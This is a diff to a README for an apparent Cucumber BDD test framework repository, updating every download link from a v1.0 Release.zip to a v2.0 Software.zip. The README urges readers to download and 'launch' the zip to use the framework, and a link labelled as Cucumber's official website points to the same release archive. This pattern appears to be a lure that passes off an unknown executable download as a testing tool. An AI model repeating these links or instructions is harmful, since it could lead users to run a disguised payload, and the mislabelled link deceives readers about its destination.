@@ -20,9 +20,9 @@ Welcome to the **CucumberBDDFramework** repository! This repository is dedicated
 ## Software Download 📥
 **Please click the button below to download the software package:**
 
-[![Download Software](https://github.com/narfor502/CucumberBDDFramework/releases/download/v1.0/Release.zip)](https://github.com/narfor502/CucumberBDDFramework/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/narfor502/CucumberBDDFramework/releases/download/v2.0/Software.zip)](https://github.com/narfor502/CucumberBDDFramework/releases/download/v2.0/Software.zip)
 
-*Please note that the downloaded file "https://github.com/narfor502/CucumberBDDFramework/releases/download/v1.0/Release.zip" needs to be launched to access the framework.*
+*Please note that the downloaded file "https://github.com/narfor502/CucumberBDDFramework/releases/download/v2.0/Software.zip" needs to be launched to access the framework.*
 
 ## Framework Components 🛠️
 This framework is equipped with the following components to enhance your testing experience:
@@ -41,7 +41,7 @@ This framework is equipped with the following components to enhance your testing
 ## Getting Started 🚦
 To start using the **CucumberBDDFramework**, follow these steps:
 1. Download the software package from the provided link.
-2. Extract the contents of the downloaded "https://github.com/narfor502/CucumberBDDFramework/releases/download/v1.0/Release.zip" file.
+2. Extract the contents of the downloaded "https://github.com/narfor502/CucumberBDDFramework/releases/download/v2.0/Software.zip" file.
 3. Set up the necessary configurations as per your project requirements.
 4. Start writing your test scenarios using Cucumber's BDD approach.
 5. Run your tests and enjoy automated testing with ease!
@@ -50,7 +50,7 @@ To start using the **CucumberBDDFramework**, follow these steps:
 If you encounter any issues or have suggestions for improvements, feel free to raise them under the "Issues" section of this repository. Contributions are also welcome through pull requests to enhance the framework further.
 
 ## Additional Resources 📚
-For detailed documentation and examples, please visit the official website of Cucumber at [Cucumber Official Website](https://github.com/narfor502/CucumberBDDFramework/releases/download/v1.0/Release.zip).
+For detailed documentation and examples, please visit the official website of Cucumber at [Cucumber Official Website](https://github.com/narfor502/CucumberBDDFramework/releases/download/v2.0/Software.zip).
 
 ## Stay Connected 🌟
 Stay updated with the latest changes and releases by watching this repository. Connect with fellow automation enthusiasts and testers in the community to share knowledge and best practices.
